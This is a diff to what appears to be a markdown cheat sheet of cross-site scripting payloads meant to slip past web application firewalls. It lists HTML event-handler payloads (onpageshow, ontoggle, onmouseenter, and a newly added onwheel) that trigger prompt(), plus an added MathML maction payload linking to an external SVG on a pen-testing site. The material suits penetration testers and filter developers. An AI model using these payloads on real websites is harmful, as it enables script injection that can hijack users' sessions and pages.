@@ -26,6 +26,9 @@ WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also
 <body onpageshow="prompt(123)">
 <details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
 <video onmouseenter=prompt(123)>
+<video onwheel=prompt(123)>
+<math><maction actiontype="statusline" 
+xlink:href="http://www.aswsec.com/pen-test/x.svg">CLICKME<mtext></mtext></maction>
 ```
 Here you will find a great resource: https://html5sec.org/
 
